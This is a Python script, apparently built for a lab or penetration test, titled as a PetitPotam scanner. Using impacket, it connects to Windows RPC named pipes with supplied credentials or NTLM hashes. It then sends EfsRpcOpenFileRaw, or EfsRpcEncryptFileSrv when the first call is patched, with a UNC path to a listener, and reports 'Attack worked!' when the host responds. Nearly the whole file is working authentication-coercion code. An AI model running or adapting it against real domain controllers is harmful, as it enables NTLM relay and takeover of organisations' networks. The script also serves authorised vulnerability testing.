#!/usr/bin/env python3
'''PETITPOTAM SCANNER'''

import sys
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD, PCHAR, RPC_SID, LPWSTR
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin

class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__( self ):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code

################################################################################
# STRUCTURES
################################################################################
class EXIMPORT_CONTEXT_HANDLE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', '20s'),
    )
class EFS_EXIM_PIPE(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )
class EFS_HASH_BLOB(NDRSTRUCT):

    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class EFS_RPC_BLOB(NDRSTRUCT):

    structure = (
        ('Data', DWORD),
        ('cbData', PCHAR),
    )

class EFS_CERTIFICATE_BLOB(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('Data', DWORD),
        ('cbData', PCHAR),
    )
class ENCRYPTION_CERTIFICATE_HASH(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_HASH_BLOB),
        ('Display', LPWSTR),
    )
class ENCRYPTION_CERTIFICATE(NDRSTRUCT):
    structure = (
        ('Lenght', DWORD),
        ('SID', RPC_SID),
        ('Hash', EFS_CERTIFICATE_BLOB),

    )
class ENCRYPTION_CERTIFICATE_HASH_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Cert', DWORD),
        ('Users', ENCRYPTION_CERTIFICATE_HASH),
    )
class ENCRYPTED_FILE_METADATA_SIGNATURE(NDRSTRUCT):
    structure = (
        ('Type', DWORD),
        ('HASH', ENCRYPTION_CERTIFICATE_HASH_LIST),
        ('Certif', ENCRYPTION_CERTIFICATE),
        ('Blob', EFS_RPC_BLOB),
    )

class ENCRYPTION_CERTIFICATE_LIST(NDRSTRUCT):
    align = 1
    structure = (
        ('Data', ':'),
    )

################################################################################
# RPC CALLS
################################################################################
class EfsRpcOpenFileRaw(NDRCALL):
    opnum = 0
    structure = (
        ('fileName', WSTR),
        ('Flag', ULONG),
    )

class EfsRpcOpenFileRawResponse(NDRCALL):
    structure = (
        ('hContext', EXIMPORT_CONTEXT_HANDLE),
        ('ErrorCode', ULONG),
    )

class EfsRpcEncryptFileSrv(NDRCALL):
    opnum = 4
    structure = (
        ('FileName', WSTR),
    )

class EfsRpcEncryptFileSrvResponse(NDRCALL):
    structure = (
        ('ErrorCode', ULONG),
    )


class CoerceAuth():
    def connect(self, username, password, domain, lmhash, nthash, target, pipe, targetIp):
        binding_params = {
            'lsarpc': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\lsarpc]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'efsr': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\efsrpc]',
                'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')
            },
            'samr': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\samr]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'lsass': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\lsass]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
            'netlogon': {
                'stringBinding': f'ncacn_np:{target}[\PIPE\netlogon]',
                'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')
            },
        }
        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)

        if targetIp:
            rpctransport.setRemoteHost(targetIp)
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_type(RPC_C_AUTHN_WINNT)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        print(f"[-] Connecting to {binding_params[pipe]['stringBinding']}")
        try:
            dce.connect()
        except Exception as e:
            print(f"Something went wrong, check error status => {str(e)}\n")
            return
        print("[+] Connected!")
        print(f"[+] Binding to {binding_params[pipe]['MSRPC_UUID_EFSR'][0]}")
        try:
            dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
        except Exception as e:
            print(f"Something went wrong, check error status => {str(e)}\n")
            return
        print("[+] Successfully bound!")
        return dce

    def EfsRpcOpenFileRaw(self, dce, listener):
        print("[-] Sending EfsRpcOpenFileRaw!")
        try:
            request = EfsRpcOpenFileRaw()
            request['fileName'] = f'\\\\{listener}\\test\\Settings.ini\x00'
            request['Flag'] = 0
            #request.dump()
            resp = dce.request(request)

        except Exception as e:
            if str(e).find('ERROR_BAD_NETPATH') >= 0:
                print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                print('[+] Attack worked!')
                return True
            if str(e).find('rpc_s_access_denied') >= 0:
                print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
                print('[+] OK! Using unpatched function!')
                print("[-] Sending EfsRpcEncryptFileSrv!")
                try:
                    request = EfsRpcEncryptFileSrv()
                    request['FileName'] = f'\\\\{listener}\\test\\Settings.ini\x00'
                    resp = dce.request(request)
                except Exception as e:
                    if str(e).find('ERROR_BAD_NETPATH') >= 0:
                        print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                        print('[+] Attack worked!')
                        return True
                    else:
                        print(f"Something went wrong, check error status => {str(e)}")

            else:
                print(f"Something went wrong, check error status => {str(e)}")


def scan(username, password, domain, lmhash, nthash, target, targetIp, port, pipe='lsarpc', listener='127.0.0.1'):
    plop = CoerceAuth()
    if lmhash is None:
        lmhash = ''
    if nthash is None:
        nthash = ''
    dce = plop.connect(username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, target=targetIp, pipe=pipe, targetIp=targetIp)
    if not dce:
        return
    if plop.EfsRpcOpenFileRaw(dce, listener):
        return {"ip":targetIp,"port":port,"vulnerableToPetitPotam":True, "username":username}
    else:
        return {"ip":targetIp,"port":port,"vulnerableToPetitPotam":False, "username":username}


if __name__ == "__main__":
    if len(sys.argv) != 7:
        exit(f'Usage: {sys.argv[0]} target_ip port domain username password ntlmhash')
    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    domain = sys.argv[3]
    username = sys.argv[4]
    password = sys.argv[5]
    ntlmhash = sys.argv[6]
    if ntlmhash:
        lmhash, nthash = ntlmhash.split(":")
    else:
        lmhash = None
        nthash = None
    print(f"Scanning for PetitPotam attack on ip:{target_ip}, port:{port}, username:{username}...")
    # The domain must be essos (not meereen.essos.local)
    verdict = scan(username, password, domain, lmhash, nthash, target_ip, target_ip, port)
    if verdict:
        results_csv = ''.join([f"{verdict[i]}," if i != list(verdict)[-1] else f"{verdict[i]}" for i in verdict])
        print(f"Results = {results_csv}")
